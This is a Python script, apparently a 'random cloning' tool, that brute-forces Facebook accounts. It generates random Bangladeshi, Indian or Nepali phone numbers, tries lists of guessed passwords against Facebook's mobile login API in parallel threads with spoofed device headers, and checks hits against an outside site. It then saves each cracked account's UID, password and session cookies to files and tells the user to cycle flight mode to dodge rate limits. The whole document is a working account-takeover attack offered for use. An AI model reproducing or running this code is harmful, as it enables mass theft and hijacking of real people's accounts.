#SCRIPTS CREATE BY HABIB HOSSAIN 
#SCRIPTS GIFT FOR EVERYONE
#-----------------------• IMPORT •-----------------------#
import os,base64,zlib,pip,urllib,sys,os,marshal,base64,zlib 
from os import path
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------• USER AGENT •-----------------------#
def ___new_up___():
	mix = random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","CPH2083","CPH2235", "CPH2499","CPH2185","CPH2065","CPH2197","CPH1989","CPH2145","F1w","CPH1909","CPH2065","CPH1937","CPH2095","CPH2083","CPH2249","CPH2083","CPH2239","CPH1979","CPH2067","CPH2069","CPH2239","CPH2015","CPH2021","CPH2205","CPH2069","CPH2161","CPH2207","CPH2239","CPH1909","CPH2185","CPH2127","CPH1923","CPH1931","PHN110", "CPH2599", "CPH2499", "CPH2557", "CPH8686", "CPH9177", "CPH9226", "OPPO F1 Plus", "CPH2071", "PCHM00", "CPH2083", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH2477", "CPH2471", "CPH2591", "CPH1923", "CPH1925", "CPH1837", "OPPO A30","RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","vi"+"vo 1901","V2"+"026","V20"+"58","viv"+"o 1716","vi"+"vo 1808","vi"+"vo 1935","vi"+"vo 1951","vi"+"vo 1906","vivo 1808","vivo 1920","vivo 1901", "V2026","V2058","vivo 1716","vivo 1935","vivo 1951","vivo 1906","V2111","vivo 1915","V1911A","V2036","vivo 1907","vivo 1906","vivo 1915","V2025","vivo 1820","vivo 1904","vivo 1901","V1955A","LG-H342","Redmi Note 4", "Redmi 4X", "Redmi 3", "Redmi 4", "Redmi 3X", "Redmi Note 7", "Redmi 6A", "Redmi Note 8 Pro", "Redmi 5A", "Redmi 5", "Redmi 6 Pro", "Redmi Note 5", "Redmi Note 4", "Redmi Y2", "Redmi 7A", "Redmi Note 7S", "Redmi Note 8T", "Redmi Note 8 Pro", "M2003J15SC", "Redmi 5 Plus", "Redmi Note 9 Pro", "Redmi Note 9S", "LDN-L21", "M2103K19G","RMX1945","RMX1911","RMX2193","RMX1945","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX2155","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX2001","RMX3263","RMX2155","RMX2001","RMX3195","RMX1945","RMX1945","RMX1993","RMX2180","RMX3630","RMX3686","RMX1805","RMX1801","RMX2020","RMX1811","RMX3063","RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921","vivo 1906","vivo 1904","vivo Y13L","vivo 1901","V2120","V2204","vivo 1902","V2310","V2333","vivo 1929","vivo 1915","vivo 1811","V2027","V2043","V2038","V2111","V2110","V2206","V2207","vivo Y23L","V2249","vivo 1613","vivo Y28L","vivo 1938","PADM00","CPH1837","PADT00","CPH1803","CPH1853","CPH1805","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH1909","CPH1901","PDBM00","CPH1941","CPH2179","CPH2083","CPH2185","CPH2185","CPH2477","CPH2591","CHP2219","CPH1923","CPH2213","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_ver_code = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0','1.7','2.0','2.25','2.5','3.0','3.5'])
	width = random.randint(720, 1440)
	height = random.randint(1080, 2560)
	fblc = random.choice(["en_US","en_GB"])
	sim_name = random.choice(['Banglalink','Robi','MTN-CG','Grameenphone','Artel','Teletalk'])
	fbpn = random.choice(["com.facebook.katana"])
	fbmf = 'Xiaomi'
	fbbd = 'Redmi'
	mobile_model = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	modelx = random.choice(["24053PY09C","2312CRNCCL","21081111RG","MI 2","M1903F10I","M1903F11I","Redmi 9T","M2006C3LII","M2004J19G","M1804C3DG","Redmi 4 Pro"])
	last = f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fb_ver_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{sim_name};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{modelx};FBSV/{mobile_model};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {mix} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+last
	return ua
#-----------------------• LOOP •-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
#-----------------------• COLOUR •-----------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;8m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\033[0;34m"
#-----------------------• STYLE •-----------------------#
xd=f"{G}•{W}";xd1=f"{G}•{W}1";xd2=f"{G}•{W}2";xd3=f"{G}•{W}3";xd4=f"{G}•{W}4";xd5=f"{G}•{W}5";xd0=f"{G}•{W}0";xdx=f"{G}•{W}?";xdxx=f"{G}•{W}"
#-----------------------• CLEAR •-----------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
#-----------------------• LOGO •-----------------------#
logo = f"""

   
   _____         _      __  __          _   _ 
  / ____|  /\   | |    |  \/  |   /\   | \ | |
 | (___   /  \  | |    | \  / |  /  \  |  \| |
  \___ \ / /\ \ | |    | |\/| | / /\ \ | . ` |
  ____) / ____ \| |____| |  | |/ ____ \| |\  |
 |_____/_/    \_\______|_|  |_/_/    \_\_| \_|
  
{W}──────────────────────────────────────────────────
{xd}DEVELOPER{xd} SALMAN-XD	
{xd} STATUS {xd} PRE{G}M{W}IUM
{xd} TOOLS  {xd} RANDOM{xd}CLONING
{W}──────────────────────────────────────────────────"""
#-----------------------• MENU •-----------------------#
def ___menu___():
    clear();print(f'{xd1} RANDOM BANGLADESH CLONING ');print(f'{xd2} RANDOM INDIA CLONING ');print(f'{xd3} RANDOM NEPAL CLONING ');linex();chude = input(f"{xdx} SELECT {xd}{G} ")
    if chude in ['1']:___Bangladesh___()
    elif chude in ['2']:___India___()
    elif chude in ['3']:___Nepal___()
    else:print(f"{xd} YOU HAVE SELECTED THE WRONG OPTION....");exit()
#-----------------------• BANGLADESH RANDOM •-----------------------#
def ___Bangladesh___():
	clear();print(f"{xd} EXAMPLE {xd} 017 {xd} 018 {xd} 019 {xd} 016");linex();code = input(f"{xdx} SELECT {xd}{G} ");clear();print(f"{xd} EXAMPLE {xd} 3000 {xd} 5000 {xd} 9999 {xd} 99999");linex();limit = int(input(f"{xdx} SELECT {xd}{G} "))
	for Kid in range(limit):swagxd = ''.join(random.choice(string.digits) for _ in range(8));user.append(swagxd)
	with tred(max_workers=30) as __ex__:
		clear();tl = str(len(user))
		print(f"{xd} SIM CODE {xd}{G} {code} {G}|{W} TOTAL UID {xd}{G} {limit}");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
			ids = code + love 
			pasx = [ids,love,love[1:],ids[:7],ids[:6],ids[:8],'bangladesh','506070','405060','102030','i love you','708090','@@@###','@#@#@#']
			__ex__.submit(___XD___,ids,pasx,tl)
#-----------------------• INDIA RANDOM •-----------------------#
def ___India___():
	clear();print(f"{xd} EXAMPLE {xd} +91639 {xd} +91633 {xd} +91699 {xd} +91647");linex();code = input(f"{xdx} SELECT {xd}{G} ");clear();print(f"{xd} EXAMPLE {xd} 3000 {xd} 5000 {xd} 9999 {xd} 99999");linex();limit = int(input(f"{xdx} SELECT {xd}{G} "))
	for Kid in range(limit):swagxd = ''.join(random.choice(string.digits) for _ in range(7));user.append(swagxd)
	with tred(max_workers=30) as __ex__:
		clear();tl = str(len(user))
		print(f"{xd} SIM CODE {xd}{G} {code} {G}|{W} TOTAL UID {xd}{G} {limit}");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
			ids = code + love 
			pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
			__ex__.submit(___XD___,ids,pasx,tl)
#-----------------------• NEPAL RANDOM •-----------------------#
def ___Nepal___():
	clear();print(f"{xd} EXAMPLE {xd} 9815 {xd} 9823 {xd} 9834 {xd} 9812");linex();code = input(f"{xdx} SELECT {xd}{G} ");clear();print(f"{xd} EXAMPLE {xd} 3000 {xd} 5000 {xd} 9999 {xd} 99999");linex();limit = int(input(f"{xdx} SELECT {xd}{G} "))
	for Kid in range(limit):swagxd = ''.join(random.choice(string.digits) for _ in range(6));user.append(swagxd)
	with tred(max_workers=30) as __ex__:
		clear();tl = str(len(user))
		print(f"{xd} SIM CODE {xd}{G} {code} {G}|{W} TOTAL UID {xd}{G} {limit}");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
			ids = code + love 
			pasx = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
			__ex__.submit(___XD___,ids,pasx,tl)
#-----------------------• RANDOM METHOD •-----------------------#
def ___XD___(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r{xd} SALMAN-XD {loop}{B}|{G}{len(ok)}{B}|{X}{len(cp)} ');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        user_agent = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ___new_up___(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text)
                                if "LIVE" in response:
                                	print(f'\r{xd}{G} SLMAN-OK {str(uid)} | {pas} | {coki} ');linex()
                                	open('/sdcard/SWAG-RANDOM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	ok.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r{xd}{X} SWAG-CP {str(uid)} | {pas} ')
                                open('/sdcard/SWAG-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------• END •-----------------------#
___menu___()